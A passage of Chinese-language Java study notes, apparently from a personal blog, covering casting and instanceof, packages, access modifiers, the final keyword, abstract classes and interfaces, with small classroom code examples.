class="comment">// 向上转型        </span></span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();        </span><br><span class="line">        a.eat();        <span class="comment">// 调用的是 Cat 的 eat</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向下转型        </span></span><br><span class="line">        <span class="type">Cat</span> <span class="variable">c</span> <span class="operator">=</span> (Cat)a;        </span><br><span class="line">        c.catchMouse();     <span class="comment">// 调用的是 Cat 的 catchMouse</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="转型的异常"><a class="header-anchor" href="#转型的异常">¶</a>转型的异常</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 向上转型        </span></span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();        </span><br><span class="line">        a.eat();               <span class="comment">// 调用的是 Cat 的 eat</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向下转型        </span></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> (Dog)a;        </span><br><span class="line">        d.watchHouse();        <span class="comment">// 调用的是 Dog 的 watchHouse 【运行报错】</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这段代码可以通过编译，但是运行时，却报出了 <code>ClassCastException</code> ，类型转换异常！</li>
<li>明明创建了Cat类型对象，运行时，当然不能转换成Dog对象的</li>
</ul>
<h5 id="instanceof关键字"><a class="header-anchor" href="#instanceof关键字">¶</a>instanceof关键字</h5>
<ul>
<li>为了避免ClassCastException的发生，Java提供了 <code>instanceof</code> 关键字，<strong>给引用变量做类型的校验</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">变量名 <span class="keyword">instanceof</span> 数据类型 </span><br><span class="line">如果变量属于该数据类型或者其子类类型，返回<span class="literal">true</span>。</span><br><span class="line">如果变量不属于该数据类型或者其子类类型，返回<span class="literal">false</span>。</span><br></pre></td></tr></table></figure>
<ul>
<li>用处：引用类型转换前，需要用<code>instanceof</code>做一个判断</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 向上转型        </span></span><br><span class="line">      <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();        </span><br><span class="line">      a.eat();               <span class="comment">// 调用的是 Cat 的 eat</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 向下转型        </span></span><br><span class="line">      <span class="keyword">if</span> (a <span class="keyword">instanceof</span> Cat) &#123;</span><br><span class="line">          <span class="type">Cat</span> <span class="variable">c</span> <span class="operator">=</span> (Cat)a;            </span><br><span class="line">          c.catchMouse();        <span class="comment">// 调用的是 Cat 的 catchMouse</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a <span class="keyword">instanceof</span> Dog) &#123;</span><br><span class="line">          <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> (Dog)a;            </span><br><span class="line">          d.watchHouse();       <span class="comment">// 调用的是 Dog 的 watchHouse</span></span><br></pre></td></tr></table></figure>
<h5 id="instanceof新特性"><a class="header-anchor" href="#instanceof新特性">¶</a>instanceof新特性</h5>
<ul>
<li>JDK14的时候提出了新特性，把判断和强转合并成了一行</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//新特性</span></span><br><span class="line"><span class="comment">//先判断a是否为Dog类型，如果是，则强转成Dog类型，转换之后变量名为d</span></span><br><span class="line"><span class="comment">//如果不是，则不强转，结果直接是false</span></span><br><span class="line"><span class="keyword">if</span>(a <span class="keyword">instanceof</span> Dog d) &#123;</span><br><span class="line">    d.lookHome();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(a <span class="keyword">instanceof</span> Cat c) &#123;</span><br><span class="line">    c.catchMouse();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;没有这个类型，无法转换&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="综合练习"><a class="header-anchor" href="#综合练习">¶</a>综合练习</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需求：</span><br><span class="line">1. 定义狗类</span><br><span class="line">属性：年龄，颜色</span><br><span class="line">        行为:</span><br><span class="line">          eat(String something)(something表示吃的东西)</span><br><span class="line">          看家lookHome方法(无参数)</span><br><span class="line">2. 定义猫类</span><br><span class="line">        属性：年龄，颜色</span><br><span class="line">        行为:</span><br><span class="line">          eat(String something)方法(something表示吃的东西)</span><br><span class="line">          逮老鼠catchMouse方法(无参数)</span><br><span class="line">3. 定义Person类//饲养员</span><br><span class="line">        属性：姓名，年龄</span><br><span class="line">        行为：</span><br><span class="line">          keepPet(Dog dog,String something)方法</span><br><span class="line">          功能：喂养宠物狗，something表示喂养的东西</span><br><span class="line">        行为：</span><br><span class="line">          keepPet(Cat cat,String something)方法</span><br><span class="line">          功能：喂养宠物猫，something表示喂养的东西</span><br><span class="line">                生成空参有参构造，set和get方法  </span><br><span class="line">4. 定义测试类(完成以下打印效果):</span><br><span class="line">        keepPet(Dog dog,String somethind)方法打印内容如下：</span><br><span class="line">                年龄为30岁的老王养了一只黑颜色的2岁的狗</span><br><span class="line">                2岁的黑颜色的狗两只前腿死死的抱住骨头猛吃</span><br><span class="line">        keepPet(Cat cat,String somethind)方法打印内容如下：</span><br><span class="line">                年龄为25岁的老李养了一只灰颜色的3岁的猫</span><br><span class="line">                3岁的灰颜色的猫眯着眼睛侧着头吃鱼</span><br><span class="line">5. 思考：        </span><br><span class="line">  - Dog和Cat都是Animal的子类，以上案例中针对不同的动物，定义了不同的keepPet方法，过于繁琐，能否简化，并体会简化后的好处？</span><br><span class="line">  - Dog和Cat虽然都是Animal的子类，但是都有其特有方法，能否想办法在keepPet中调用特有方法？</span><br><span class="line">6. 画图分析</span><br><span class="line">  - 基类Animal——子类1Dog</span><br><span class="line">  - 基类Animal——子类2Cat</span><br><span class="line">  - Person类</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 部分代码</span></span><br><span class="line"><span class="comment">// 以下是Person类部分代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 想要一个方法，能接收所有的动物，包括猫，包括狗</span></span><br><span class="line">    <span class="comment">// 方法的形参：可以写这些类的父类 Animal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keepPet</span><span class="params">(Animal a, String something)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(a <span class="keyword">instanceof</span> Dog d)&#123;  <span class="comment">// 运用的是instanceof的新特性，判断与类型强制转换同时进行</span></span><br><span class="line">            System.out.println(<span class="string">&quot;年龄为&quot;</span> + age + <span class="string">&quot;岁的&quot;</span> + name + <span class="string">&quot;养了一只&quot;</span> + d.getColor() + <span class="string">&quot;颜色的&quot;</span> + d.getAge() + <span class="string">&quot;岁的狗&quot;</span>);</span><br><span class="line">            d.eat(something);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a <span class="keyword">instanceof</span> Cat c)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;年龄为&quot;</span> + age + <span class="string">&quot;岁的&quot;</span> + name + <span class="string">&quot;养了一只&quot;</span> + c.getColor() + <span class="string">&quot;颜色的&quot;</span> + c.getAge() + <span class="string">&quot;岁的猫&quot;</span>);</span><br><span class="line">            c.eat(something);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;没有这种动物&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="包"><a class="header-anchor" href="#包">¶</a>包</h3>
<ul>
<li>包在操作系统中其实就是一个文件夹。<strong>包是用来分门别类的管理技术，不同的技术类放在不同的包下</strong>，方便管理和维护</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">路径名.路径名.xxx.xxx</span><br><span class="line"><span class="comment">// 例如：com.itheima.oa</span></span><br></pre></td></tr></table></figure>
<ul>
<li>包名一般是公司域名的倒写。例如：黑马是<a href="http://www.itheima.com">www.itheima.com</a>,包名就可以定义成com.itheima.技术名称。</li>
<li>包名必须用”.“连接。</li>
<li>包名的每个路径名必须是一个合法的标识符，而且不能是Java的关键字</li>
</ul>
<h4 id="导包"><a class="header-anchor" href="#导包">¶</a>导包</h4>
<ul>
<li>
<p>什么时候需要导包？</p>
<ul>
<li>情况一：在使用Java中提供的非核心包中的类时</li>
<li>情况二：使用自己写的其他包中的类时</li>
</ul>
</li>
<li>
<p>什么时候不需要导包？</p>
<ul>
<li>情况一：在使用Java核心包（java.lang）中的类时</li>
<li>情况二：在使用自己写的同一个包中的类时</li>
</ul>
</li>
</ul>
<h4 id="使用不同包下的相同类"><a class="header-anchor" href="#使用不同包下的相同类">¶</a>使用不同包下的相同类</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用全类名的形式即可。</span></span><br><span class="line"><span class="comment">//全类名：包名 + 类名</span></span><br><span class="line"><span class="comment">//拷贝全类名的快捷键：选中类名crtl + shift + alt + c 或者用鼠标点copy，再点击copy Reference</span></span><br><span class="line">com.itheima.homework.demo1.<span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.itheima.homework.demo1.Student();</span><br><span class="line">com.itheima.homework.demo2.<span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.itheima.homework.demo2.Student();</span><br></pre></td></tr></table></figure>
<h3 id="权限修饰符"><a class="header-anchor" href="#权限修饰符">¶</a>权限修饰符</h3>
<ul>
<li><code>public &gt; protected &gt; 默认 &gt; private</code></li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>public</th>
<th>protected</th>
<th>默认</th>
<th>private</th>
</tr>
</thead>
<tbody>
<tr>
<td>同一类中</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>同一包中的类</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td></td>
</tr>
<tr>
<td>不同包的子类</td>
<td>√</td>
<td>√</td>
<td></td>
<td></td>
</tr>
<tr>
<td>不同包中的无关类</td>
<td>√</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>编写代码时，如果没有特殊的考虑，建议这样使用权限：</p>
<ul>
<li>成员变量使用<code>private</code> ，隐藏细节。</li>
<li>构造方法使用<code>public</code> ，方便创建对象。</li>
<li>成员方法使用<code>public</code> ，方便调用方法。</li>
</ul>
<blockquote>
<p>小贴士：不加权限修饰符，就是默认权限</p>
</blockquote>
<h3 id="final关键字"><a class="header-anchor" href="#final关键字">¶</a>final关键字</h3>
<ul>
<li>
<p>子类可以在父类的基础上改写父类内容，比如方法重写。</p>
</li>
<li>
<p>有一个方法不想别人去改写里面内容→<code>final</code></p>
</li>
<li>
<p><code>final</code> 关键字，表示修饰的内容不可变。</p>
<ul>
<li><strong>final</strong>：  不可改变，最终的含义。可以用于修饰类、方法和变量。
<ul>
<li>类：被修饰的类，不能被继承。</li>
<li>方法：被修饰的方法，不能被重写。</li>
<li>变量：被修饰的变量，有且仅能被赋值一次。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="使用方式"><a class="header-anchor" href="#使用方式">¶</a>使用方式</h4>
<h5 id="修饰类"><a class="header-anchor" href="#修饰类">¶</a>修饰类</h5>
<ul>
<li>
<p>final修饰的类，不能被继承</p>
</li>
<li>
<pre><code class="language-java">final class 类名 &#123;
&#125;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 查询API发现像 `public final class String` 、`public final class Math` 、`public final class Scanner` 等，很多我们学习过的类，都是被final修饰的，目的就是供我们使用，而不让我们所以改变其内容</span><br><span class="line"></span><br><span class="line">##### 修饰方法</span><br><span class="line"></span><br><span class="line">- final修饰的方法，不能被重写</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">修饰符 final 返回值类型 方法名(参数列表)&#123;</span><br><span class="line">    //方法体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
<h5 id="修饰变量-局部变量"><a class="header-anchor" href="#修饰变量-局部变量">¶</a>修饰变量-局部变量</h5>
<h6 id="局部变量-基本类型"><a class="header-anchor" href="#局部变量-基本类型">¶</a>局部变量-基本类型</h6>
<ul>
<li>基本类型的局部变量，被final修饰后，只能赋值一次，不能再更改</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写法1</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    c = i;</span><br><span class="line">    <span class="comment">// 报错</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 写法2</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> i;</span><br><span class="line">    <span class="comment">// 不报错，因为每次循环都是一次新的变量c</span></span><br></pre></td></tr></table></figure>
<h5 id="修饰变量-成员变量"><a class="header-anchor" href="#修饰变量-成员变量">¶</a>修饰变量-成员变量</h5>
<ul>
<li>成员变量涉及到初始化的问题，初始化方式有显示初始化和构造方法初始化，只能选择其中一个</li>
<li>显示初始化(在定义成员变量的时候立马赋值)（常用）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>构造方法初始化(在构造方法中赋值一次)（不常用，了解即可）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注意：每个构造方法中都要赋值一次</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> num2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num2 = <span class="number">20</span>;</span><br><span class="line"><span class="comment">//     this.num2 = 20;</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num2 = <span class="number">20</span>;</span><br><span class="line"><span class="comment">//     this.num2 = 20;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 啥意思没搞懂= = </span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>被final修饰的常量名称，一般都有书写规范，所有字母都<strong>大写</strong>。</p>
</blockquote>
<h2 id="Day15-面向对象进阶（抽象类-接口-内部类）"><a class="header-anchor" href="#Day15-面向对象进阶（抽象类-接口-内部类）">¶</a>Day15 面向对象进阶（抽象类&amp;接口&amp;内部类）</h2>
<ul>
<li>能够写出抽象类的格式</li>
<li>能够写出抽象方法的格式</li>
<li>能说出抽象类的应用场景</li>
<li>写出定义接口的格式</li>
<li>写出实现接口的格式</li>
<li>说出接口中成员的特点</li>
<li>能说出接口的应用场景</li>
<li>能说出接口中为什么会出现带有方法体的方法</li>
<li>能完成适配器设计模式</li>
</ul>
<h3 id="抽象类"><a class="header-anchor" href="#抽象类">¶</a>抽象类</h3>
<ul>
<li>
<p>父类可能知道子类应该有哪个功能，但是功能具体怎么实现父类是不清楚的（由子类自己决定），父类只需要提供一个没有方法体的定义即可，具体实现交给子类自己去实现</p>
</li>
<li>
<p><strong>把没有方法体的方法称为抽象方法</strong></p>
</li>
<li>
<p><strong>Java语法规定，包含抽象方法的类就是抽象类</strong>。</p>
<ul>
<li><strong>抽象方法</strong> ： 没有方法体的方法。</li>
<li><strong>抽象类</strong>：包含抽象方法的类</li>
</ul>
</li>
</ul>
<h4 id="abstract使用"><a class="header-anchor" href="#abstract使用">¶</a>abstract使用</h4>
<h5 id="抽象方法"><a class="header-anchor" href="#抽象方法">¶</a>抽象方法</h5>
<ul>
<li>抽象方法只包含一个方法名，而没有方法体</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 <span class="keyword">abstract</span> 返回值类型 方法名 (参数列表);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>；</span><br></pre></td></tr></table></figure>
<h5 id="抽象类-v2"><a class="header-anchor" href="#抽象类-v2">¶</a>抽象类</h5>
<ul>
<li>如果一个类包含抽象方法，那么该类必须是抽象类。【才知道= =】</li>
<li><strong>注意：抽象类不一定有抽象方法，但是有抽象方法的类必须定义成抽象类</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> class 类名字 &#123; </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="抽象类的使用"><a class="header-anchor" href="#抽象类的使用">¶</a>抽象类的使用</h5>
<ul>
<li><strong>要求</strong>：继承抽象类的子类<strong>必须重写父类所有的抽象方法</strong>。</li>
<li>否则，该子类也必须声明为抽象类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父类,抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> String id;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(String id, String name, <span class="type">double</span> salary)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.id = id;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.salary = salary;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 抽象方法</span></span><br><span class="line">  <span class="comment">// 抽象方法必须要放在抽象类中</span></span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个子类继承抽象类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Manager</span> <span class="keyword">extends</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Manager</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Manager</span><span class="params">(String id, String name, <span class="type">double</span> salary)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(id, name, salary);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 2.重写父类的抽象方法</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;管理其他人&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个子类继承抽象类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cook</span> <span class="keyword">extends</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Cook</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Cook</span><span class="params">(String id, String name, <span class="type">double</span> salary)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(id, name, salary);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;厨师炒菜多加点盐...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo10</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建抽象类,抽象类不能创建对象</span></span><br><span class="line">    <span class="comment">// 假设抽象类让我们创建对象,里面的抽象方法没有方法体,无法执行.所以不让我们创建对象</span></span><br><span class="line"><span class="comment">//    Employee e = new Employee();</span></span><br><span class="line"><span class="comment">//    e.work();</span></span><br><span class="line">    <span class="comment">// 3.创建子类</span></span><br><span class="line">    <span class="type">Manager</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Manager</span>();</span><br><span class="line">    m.work();</span><br><span class="line">    <span class="type">Cook</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cook</span>(<span class="string">&quot;ap002&quot;</span>, <span class="string">&quot;库克&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    c.work();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>此时的方法重写，是子类对父类抽象方法的完成实现，我们将这种方法重写的操作，也叫做<strong>实现方法</strong></li>
</ul>
<h4 id="抽象类的特征"><a class="header-anchor" href="#抽象类的特征">¶</a>抽象类的特征</h4>
<ul>
<li>
<p>总结起来可以说是 <strong>有得有失</strong></p>
<ul>
<li>
<p><strong>有得：抽象类得到了拥有抽象方法的能力。</strong></p>
</li>
<li>
<p><strong>有失：抽象类失去了创建对象的能力。</strong></p>
</li>
<li>
<p>其他成员（构造方法，实例方法，静态方法等）抽象类都是具备的</p>
</li>
</ul>
</li>
</ul>
<h4 id="抽象类的细节"><a class="header-anchor" href="#抽象类的细节">¶</a>抽象类的细节</h4>
<ul>
<li>
<p>不需要背，只要当idea报错之后，知道如何修改即可</p>
</li>
<li>
<p>理解抽象的本质，无需死记硬背</p>
</li>
</ul>
<ol>
<li>抽象类<strong>不能创建对象</strong>，如果创建，编译无法通过而报错。只能创建其非抽象子类的对象。</li>
</ol>
<blockquote>
<p>理解：假设创建了抽象类的对象，调用抽象的方法，而抽象方法没有具体的方法体，没有意义。</p>
</blockquote>
<ol start="2">
<li>抽象类中，可以有构造方法，是供子类创建对象时，初始化父类成员使用的。</li>
</ol>
<blockquote>
<p>理解：子类的构造方法中，有默认的super()，需要访问父类构造方法。</p>
</blockquote>
<ol start="3">
<li>抽象类中，不一定包含抽象方法，但是有抽象方法的类必定是抽象类。</li>
</ol>
<blockquote>
<p>理解：未包含抽象方法的抽象类，目的就是不想让调用者创建该类对象，通常用于某些特殊的类结构设计。</p>
</blockquote>
<ol start="4">
<li>抽象类的子类，必须重写抽象父类中<strong>所有的</strong>抽象方法，否则子类也必须定义成抽象类，编译无法通过而报错。</li>
</ol>
<blockquote>
<p>理解：假设不重写所有抽象方法，则类中可能包含抽象方法。那么创建对象后，调用抽象的方法，没有意义。</p>
</blockquote>
<ol start="5">
<li><strong>抽象类存在的意义是为了被子类继承</strong>。</li>
</ol>
<blockquote>
<p>理解：抽象类中已经实现的是模板中确定的成员，抽象类不确定如何实现的定义成抽象方法，交给具体的子类去实现。</p>
</blockquote>
<h4 id="抽象类存在的意义"><a class="header-anchor" href="#抽象类存在的意义">¶</a>抽象类存在的意义</h4>
<ul>
<li>抽象类存在的意义是为了被子类继承，否则抽象类将毫无意义</li>
<li>抽象类可以强制让子类，一定要按照规定的格式进行重写</li>
</ul>
<h3 id="接口"><a class="header-anchor" href="#接口">¶</a>接口</h3>
<ul>
<li>接口中全部是抽象方法</li>
<li>接口不能创建对象</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口的定义格式：</span></span><br><span class="line">interface 接口名称&#123;</span><br><span class="line">    <span class="comment">// 抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接口的声明：interface</span></span><br><span class="line"><span class="comment">// 接口名称：首字母大写，满足“驼峰模式”</span></span><br></pre></td></tr></table></figure>
<h4 id="接口成分的特点"><a class="header-anchor" href="#接口成分的特点">¶</a>接口成分的特点</h4>
<h5 id="抽象方法-v2"><a class="header-anchor" href="#抽象方法-v2">¶</a>抽象方法</h5>
<ul>
<li>接口中的抽象方法默认会自动加上public abstract修饰，无需自己手写</li>
</ul>
<h5 id="常量"><a class="header-anchor" href="#常量">¶</a>常量</h5>
<ul>
<li>
<p>在接口中定义的成员变量默认会加上： public static final修饰</p>
</li>
<li>
<p>在接口中定义的成员变量实际上是一个常量。使用public static final修饰后，变量值就不可被修改</p>
</li>
<li>
<p>并且是静态化的变量可以直接用接口名访问，所以也叫常量</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InterF</span> &#123;</span><br><span class="line">    <span class="comment">// 抽象方法！</span></span><br><span class="line">    <span class="comment">//    public abstract void run();</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    public abstract String getName();</span></span><br><span class="line">    String <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    public abstract int add(int a , int b);</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a , <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 它的最终写法是：</span></span><br><span class="line">    <span class="comment">// public static final int AGE = 12 ;</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">AGE</span>  <span class="operator">=</span> <span class="number">12</span>; <span class="comment">//常量</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">SCHOOL_NAME</span> <span class="operator">=</span> <span class="string">&quot;黑马程序员&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="基本的实现"><a class="header-anchor" href="#基本的实现">¶</a>基本的实现</h4>
<ul>
<li>类与接口的关系为实现关系，即<strong>类实现接口</strong>，该类可以称为接口的[实现类]，也可以称为接口的[子类]</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**接口的实现：</span></span><br><span class="line"><span class="comment">    在Java中接口是被实现的，实现接口的类称为实现类。</span></span><br><span class="line"><span class="comment">    实现类的格式:*/</span></span><br><span class="line">class 类名 implements 接口<span class="number">1</span>,接口<span class="number">2</span>,接口<span class="number">3.</span>..&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="类实现接口的要求和意义"><a class="header-anchor" href="#类实现接口的要求和意义">¶</a>类实现接口的要求和意义</h5>
<ol>
<li>必须重写实现的全部接口中所有抽象方法。</li>
<li>如果一个类实现了接口，但是没有重写完全部接口的全部抽象方法，这个类也必须定义成抽象类。</li>
<li><strong>意义：接口体现的是一种【规范】，接口对实现类是一种【强制性的约束】，要么全部完成接口申明的功能，要么自己也定义成抽象类。这正是一种强制性的规范</strong></li>
</ol>
<h5 id="类实现接口基本案例"><a class="header-anchor" href="#类实现接口基本案例">¶</a>类实现接口基本案例</h5>
